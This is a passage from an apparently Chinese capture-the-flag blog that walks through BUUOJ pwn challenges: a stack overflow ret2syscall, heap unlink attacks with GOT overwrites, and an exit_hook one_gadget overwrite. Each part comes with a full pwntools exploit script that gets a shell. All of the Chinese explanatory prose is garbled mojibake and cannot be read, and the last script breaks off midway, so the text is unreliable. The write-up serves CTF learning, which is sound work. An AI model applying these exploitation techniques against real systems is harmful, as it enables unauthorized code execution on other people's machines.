<p>ç„¶åè¿”å›åˆ°æœ€åˆå†æ¬¡æ‰§è¡Œï¼Œå› ä¸ºæ‰§è¡Œå®Œå‡½æ•°çš„è¿”å›å€¼æ˜¯å­˜åœ¨eaxä¸­çš„ï¼Œæ‰€ä»¥ä¸ºäº†è¾¾æˆ0xbï¼Œç¬¬äºŒæ¬¡æ‰§è¡Œreadå‡½æ•°æ—¶ï¼Œè¦è¾“å…¥0xbä¸ªæ•°æ®ï¼Œå› ä¸ºexecve(/bin/sh,0,0)ï¼Œæ‰€ä»¥æˆ‘ä»¬ç¬¬äºŒæ¬¡çš„è¿”å›åœ°å€è¦ç›´æ¥è¿”å›åˆ°readå‡½æ•°ä¼ å‚ï¼ˆæ­¤æ—¶eaxå·²ç»æ˜¯0xbäº†ï¼Œä¸èƒ½å†æ‰§è¡Œ0x804811Dï¼Œä¸ç„¶eaxçš„å€¼å°†ä¼šè¢«ä¿®æ”¹ï¼‰ï¼Œå› ä¸ºæ‰§è¡Œå®Œretåï¼Œespä¼šåŠ 4ï¼Œç§»åŠ¨åˆ°æˆ‘ä»¬æº¢å‡ºçš„p32(0)ï¼Œç„¶åä¼ å‚æ‰ä¼šæŠŠ/bin/shåœ°å€ä¼ å…¥åˆ°ebxä¸­ï¼Œè€Œ0x8048212è¿™ä¸ªåœ°å€ï¼Œåœ¨äºè¿™ä¸ªåœ°å€ä¸Šçš„å€¼å¿…é¡»æ˜¯0ï¼Œæ»¡è¶³è¿™ä¸ªè¦æ±‚å³å¯ï¼Œè¿™æ ·æ‰èƒ½æ»¡è¶³åç»­ä¼ å…¥çš„æ˜¯ä¸¤ä¸ª0</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831104312190.png" alt="image-20210831104312190"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,25785)</span><br>p = process(<span class="hljs-string">&quot;./warmup&quot;</span>)<br>bss = <span class="hljs-number">0x80491bc</span><br>start = <span class="hljs-number">0x080480D8</span><br>read = <span class="hljs-number">0x0804811D</span><br>gdb.attach(p)<br>p.recvuntil(<span class="hljs-string">&#x27;2016!&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(read)+p32(start)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">8</span>)<br>p.send(payload)<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(read)+p32(<span class="hljs-number">0x08048122</span>)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">0x8048212</span>)<br>p.send(payload)<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">3</span>  )<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="åäº”ã€hitcontraining-unlink"><a href="#åäº”ã€hitcontraining-unlink" class="headerlink" title="åäº”ã€hitcontraining_unlink"></a>åäº”ã€hitcontraining_unlink</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831153526197.png" alt="image-20210831153526197"></p>
<p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ64ä½ï¼Œå¼€äº†NXï¼ŒCanary</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831154605863.png" alt="image-20210831154605863"></p>
<p>è¿›å…¥IDAï¼Œå››ä¸ªèœå•åŠŸèƒ½éƒ½å…·å¤‡ï¼ŒåŒæ—¶è¿˜æ‰¾åˆ°ä¸ªåé—¨å‡½æ•°ï¼Œä½†æ˜¯çœ‹è·¯å¾„ï¼Œåº”è¯¥æ˜¯ç”¨ä¸äº†çš„ï¼Œbuuçš„flagå°±åœ¨æ ¹ç›®å½•ä¸‹çš„</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831155631822.png" alt="image-20210831155631822"></p>
<p>æ¼æ´ç‚¹åœ¨äºä¿®æ”¹å‡½æ•°é‡Œé¢ï¼Œå¯¹äºä¿®æ”¹çš„sizeæ²¡æœ‰æ£€æŸ¥ï¼Œå­˜åœ¨å †æº¢å‡º</p>
<p>ç”±äºåœ¨è¾“å…¥åä¼šåŠ 0æˆªæ–­ï¼Œå¹¶ä¸”æ²¡å¼€PIEï¼Œå †æŒ‡é’ˆç®€å•å¯å¯»ï¼Œæ‰€ä»¥è¿™é¢˜ç”¨unlinkåšã€‚ç›®æ ‡æ˜¯åŠ«æŒatoiçš„gotï¼Œ</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831202645476.png" alt="image-20210831202645476"></p>
<p>è¿™é‡Œæ˜¯è§¦å‘äº†unlinkï¼Œä¸‹ä¸€ä¸ªå¤§å°ä¸º0x80çš„å †å—ä¸æˆ‘ä»¬ä¼ªé€ çš„å¤§å°ä¸º0x40çš„å †å—åˆå¹¶æ”¾å…¥unsorted bin ä¸­</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831203042925.png" alt="image-20210831203042925"></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831203937694.png" alt="image-20210831203937694"></p>
<p>åŒæ—¶ï¼ŒæŒ‡å‘chunk0çš„æŒ‡é’ˆä¿å­˜çš„åœ°å€æ¢ä¸ºäº†ptr - 0x18çš„å€¼ï¼Œæ‰€ä»¥ï¼Œæ­¤æ—¶å¯ä»¥è®¤ä¸ºchunk0å˜æˆæ˜¯åœ¨ptr - 0x18çš„åœ°æ–¹äº†ã€‚æ‰€ä»¥æ­¤æ—¶å†æŠŠå †æŒ‡é’ˆæ”¹ä¸ºå‡½æ•°gotè¡¨åœ°å€ï¼Œä»è€Œæ³„éœ²libcåœ°å€</p>
<p>è€Œåˆšå¥½ï¼Œæ­¤æ—¶åˆæ˜¯atoiçš„gotè¡¨åœ°å€ï¼Œæ‰€ä»¥ç›´æ¥ç»§ç»­å¾€é‡Œé¢å†™å…¥systemçš„åœ°å€å³å¯ï¼Œæœ€åå†è¾“å…¥/bin/sh\x00å³å¯</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831204445381.png" alt="image-20210831204445381"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25062</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;length of item name:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;the name of item:&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index of item:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;length of item name:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.recvuntil(<span class="hljs-string">&quot;the new name of the item:&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;the index of item:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>atoi_got = elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>ptr = <span class="hljs-number">0x00000000006020C8</span><br>add(<span class="hljs-number">0x40</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;c&#x27;</span>)<br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x41</span>) <span class="hljs-comment">#fake_chunk header</span><br>fake_chunk += p64(ptr - <span class="hljs-number">0x18</span>) + p64(ptr - <span class="hljs-number">0x10</span>) <span class="hljs-comment">#fake_chunk fd  bk</span><br>fake_chunk += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0x90</span>) <span class="hljs-comment">#fake prev_size size</span><br>edit(<span class="hljs-number">0</span>,fake_chunk)<br>free(<span class="hljs-number">1</span>)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0x40</span>) + p64(atoi_got)<br>edit(<span class="hljs-number">0</span>,payload)<br>show()<br>p.recvuntil(<span class="hljs-string">&#x27;0 : &#x27;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] <br>log.success(<span class="hljs-built_in">hex</span>(system))<br>edit(<span class="hljs-number">0</span>,p64(system))<br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="åå…­ã€wustctf2020-closed"><a href="#åå…­ã€wustctf2020-closed" class="headerlink" title="åå…­ã€wustctf2020_closed"></a>åå…­ã€wustctf2020_closed</h2><p>è¿™é¢˜æ¯”è¾ƒæœ‰æ„æ€ï¼Œè®°å½•ä¸€ä¸‹ï¼Œè€ƒçš„æ˜¯linuxçš„åŸºç¡€çŸ¥è¯†</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210902152712612.png" alt="image-20210902152712612"></p>
<p>è¿›å…¥IDAï¼Œç¨‹åºååˆ†ç®€å•ï¼Œç”šè‡³ä¸»å‡½æ•°å·²ç»è¿è¡Œäº†system(â€œ/bin/shâ€)äº†ï¼Œä½†æ˜¯æ³¨æ„è¿™è¾¹æ‰§è¡Œäº†close(1)ä»¥åŠclose(2)ã€‚è¿™ä»£è¡¨ä»€ä¹ˆï¼Ÿä»£è¡¨å…³é—­äº†linuxé‡Œé¢çš„æ ‡å‡†è¾“å‡º(1)å’Œæ ‡å‡†é”™è¯¯(2)ï¼Œæ‰€ä»¥å³ä½¿å·²ç»getshelläº†ï¼Œä½†æ˜¯æˆ‘ä»¬æ˜¯çœ‹ä¸åˆ°è¾“å‡ºçš„ï¼Œæ‰€ä»¥è¿™æ—¶å€™è¾“å…¥<code>exec 1&gt;&amp;0</code>å°±å¯ä»¥è®©æ ‡å‡†è¾“å‡ºçš„æ–‡ä»¶æè¿°ç¬¦é‡å®šå‘ä¸º0ï¼Œè€Œ0æ²¡è¢«å…³é—­ï¼Œæ‰èƒ½çœ‹åˆ°è¾“å‡º</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210902152420434.png" alt="image-20210902152420434"></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210902152447680.png" alt="image-20210902152447680"></p>
<h2 id="åä¸ƒã€ciscn-2019-n-7"><a href="#åä¸ƒã€ciscn-2019-n-7" class="headerlink" title="åä¸ƒã€ciscn_2019_n_7"></a>åä¸ƒã€ciscn_2019_n_7</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904105152457.png" alt="image-20210904105152457"></p>
<p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ64ä½ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904111520818.png" alt="image-20210904111520818"></p>
<p>è¿›å…¥IDAï¼Œåˆ†æç¨‹åºï¼Œé¦–å…ˆç¨‹åºä¸å­˜åœ¨é‡Šæ”¾åŠŸèƒ½ï¼Œå¹¶ä¸”å †å—åªèƒ½ç”Ÿæˆä¸€æ¬¡ï¼Œè¿™ç›´æ¥æ–­ç»äº†åŠ«æŒhookæŒ‡é’ˆçš„åšæ³•</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904111633970.png" alt="image-20210904111633970"></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904111749218.png" alt="image-20210904111749218"></p>
<p>åœ¨addï¼Œeditå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä¿®æ”¹ç¨‹åºä¸­çš„å †å—æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æ‹¥æœ‰äº†ä»»æ„å†™çš„èƒ½åŠ›</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904111836132.png" alt="image-20210904111836132"></p>
<p>å…¶æ¬¡åœ¨è¾“å…¥666åï¼Œç¨‹åºä¼šæ‰“å°å‡ºputsçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯ä¹Ÿæ‹¥æœ‰äº†libcåœ°å€ï¼Œä¼¼ä¹ä¸€åˆ‡éƒ½å…·å¤‡äº†ï¼Ÿå°±å·®ä¸€ä¸ªå¯ä»¥è®©æˆ‘ä»¬ç›´æ¥å†™å…¥one_gadgetçš„åœ°æ–¹ã€‚å†™åœ¨å“ªï¼Ÿè¿™é‡Œä»‹ç»ä¸€ä¸ªæ–°çš„hookï¼Œexit_hookï¼Œåœ¨æ‰§è¡Œexitå‡½æ•°æ—¶ï¼Œä¼šæ‰§è¡Œåˆ°ä¸¤ä¸ªå‡½æ•°ï¼Œåˆ†åˆ«æ˜¯<code>_dl_rtld_lock_recursive</code>å’Œ<code>_dl_rtld_unlock_recursive</code>ï¼Œå…¶ä¸­ä¸€ä¸ªåŠ«æŒä¸ºone_gadgetéƒ½è¡Œï¼Œå¹¶ä¸”è¿™ä¸¤ä¸ªçš„åç§»æ˜¯å›ºå®šçš„å€¼</p>
<p>libc-2.23.so:</p>
<ul>
<li>rtld_lock = libc_base + 0x5F0F48</li>
<li>rtld_unlock = libc_base + 0x5F0F50</li>
</ul>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904113624683.png" alt="image-20210904113624683"></p>
<p>åˆšå¥½å¾ˆå·§ï¼Œè¿™è¾¹æ‰§è¡Œåˆ°exitæ—¶ï¼Œä¹Ÿæ˜¯æŠŠæ–‡ä»¶æè¿°ç¬¦1å’Œ2å…³é—­äº†ï¼Œçœ‹ä¸è§è¾“å‡ºï¼Œæ‰€ä»¥è·Ÿä¸Šé¢˜ä¸€æ ·çš„å¤„ç†æ–¹å¼ï¼Œ<code>exec 1&gt;&amp;0</code>æ‰èƒ½çœ‹åˆ°äº¤äº’</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904113504655.png" alt="image-20210904113504655"></p>
<p>æˆåŠŸgetshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_n_7&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28496</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Input string Length:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;name:&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">name,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;New Author name:&quot;</span>)<br>	p.send(name)<br>	p.recvuntil(<span class="hljs-string">&quot;contents:&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exit</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;666&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>ogg = libc_base + <span class="hljs-number">0xf1147</span><br>rtld_lock = libc_base + <span class="hljs-number">0x5F0F48</span><br>add(<span class="hljs-number">0x60</span>,p64(rtld_lock) * <span class="hljs-number">2</span>)<br>edit(p64(rtld_lock) * <span class="hljs-number">2</span>,p64(ogg))<br>exit()<br>p.sendline(<span class="hljs-string">&quot;exec 1&gt;&amp;0&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;ls&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="åä¹ã€ciscn-2019-es-4"><a href="#åä¹ã€ciscn-2019-es-4" class="headerlink" title="åä¹ã€ciscn_2019_es_4"></a>åä¹ã€ciscn_2019_es_4</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904121810292.png" alt="image-20210904121810292"></p>
<p>checksecä¸€ä¸‹ï¼Œ64ä½ï¼ŒPIEæ²¡å¼€</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904221627524.png" alt="image-20210904221627524"></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904221644339.png" alt="image-20210904221644339"></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904221657542.png" alt="image-20210904221657542"></p>
<p>é¦–å…ˆæ¼æ´ç‚¹å­˜åœ¨editå‡½æ•°é‡Œé¢ï¼Œoffbynullï¼Œå…¶æ¬¡editå’Œshowå‡½æ•°ï¼Œéƒ½å­˜åœ¨éªŒè¯æ¬¡æ•°é—®é¢˜ï¼Œå¹¶ä¸”éªŒè¯çš„å€¼ä¿å­˜åœ¨.bssä¸Šï¼Œæ²¡å¼€PIEï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåº”è¯¥æ˜¯unlinkçš„é¢˜ï¼ŒæŠŠchunkæ”¹åˆ°.bssä¸Šï¼Œç„¶åä¿®æ”¹keyå€¼ã€‚ç„¶åç‰ˆæœ¬æ˜¯libc-2.27.soï¼Œå­˜åœ¨tcacheï¼Œæ‰€ä»¥åœ¨å‡chunkåº•ä¸‹é‚£ä¸ªchunkè¦é‡Šæ”¾ä¸ƒä¸ªç›¸åŒå¤§å°å»å¡«å……tcache bin</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904230122725.png" alt="image-20210904230122725"></p>
<p>unlinkæˆåŠŸï¼ŒæŠŠchunkçš„æŒ‡é’ˆè®¾ä¸º.bssä¸Šçš„å€¼</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904231117920.png" alt="image-20210904231117920"></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904231321497.png" alt="image-20210904231321497"></p>
<p>é€šè¿‡unlinkè®¾ç½®çš„æŒ‡é’ˆï¼ŒæŠŠå‰é¢ä¸¤ä¸ªä¿®æ”¹ä¸ºåŒä¸€ä¸ªå †åœ°å€ï¼Œå€Ÿæ­¤é€ æˆdouble freeï¼Œç„¶åæŠŠå †å—åˆ†é…åˆ°keyä¸Šï¼Œä¿®æ”¹keyå€¼ï¼Œè®©showåŠŸèƒ½æ¢å¤ä½¿ç”¨ï¼Œç„¶åé€šè¿‡showåŠŸèƒ½æ³„éœ²libcåœ°å€ã€‚ç„¶åå†æ¬¡ä½¿ç”¨unlinkè®¾ç½®å¥½çš„æŒ‡é’ˆï¼ŒæŠŠå‰é¢çš„å †å—æŒ‡é’ˆæ”¹ä¸ºæŒ‡å‘free_hookï¼Œç„¶åé€šè¿‡editå‡½æ•°ï¼Œå¾€é‡Œé¢å†™å…¥systemå‡½æ•°ï¼Œä¹‹åfreeä¸€ä¸ªå†™æœ‰/bin/shçš„å †å—å³å¯</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904234122710.png" alt="image-20210904234122710"></p>
<p>ç„¶åï¼Œè¿œç¨‹æ‰“æ—¶ï¼Œå †å—åœ°å€æ˜¯åªæœ‰å›¾ä¸­é‚£ä¹ˆé•¿çš„ï¼Œè¦æ³¨æ„ä¸€ä¸‹ã€‚ç„¶åå°±æ˜¯æˆ‘ä»¬æœ€åå¾€free_hookå†™å…¥systemçš„é‚£ä¸ªå †å—ï¼Œå¿…é¡»è¦åœ¨è¿™ä¹‹å‰æ˜¯è¢«ç”³è¯·å‡ºæ¥çš„ï¼Œå…·ä½“åŸå› æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæˆ‘åšçš„æ—¶å€™ä¸€ç›´å¡åœ¨è¿™æœ€åä¸€æ­¥ï¼Œæ²¡æƒ³é€šï¼Œç„¶åæ˜¯å¯¹ç…§åˆ«äººwpæ‰æ”¹äº†è¿™ä¸ªç‚¹ï¼Œç„¶åé€šäº†</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210905095712141.png" alt="image-20210905095712141"></p>
<p>getshellï¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_es_4&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29483</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;4.show\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;size:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;gift: &quot;</span>)<br>	addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">7</span>),<span class="hljs-number">16</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;content:\n&quot;</span>)<br>	p.send(content)<br>	<span class="hljs-keyword">return</span> addr<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;4.show\n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;content:\n&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;4.show\n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;4.show\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>ptr = <span class="hljs-number">0x602118</span><br>key = <span class="hljs-number">0x00000000006022B8</span><br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>	add(i,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;\x07&#x27;</span> * <span class="hljs-number">0xf0</span>)<br>heap_addr = add(<span class="hljs-number">7</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>log,success(<span class="hljs-string">&quot;heap_addr==&gt;0x%x&quot;</span> %heap_addr)<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-string">&quot;b&quot;</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;c&quot;</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">7</span>):<br>	free(i)<br><span class="hljs-comment">#unlink</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + 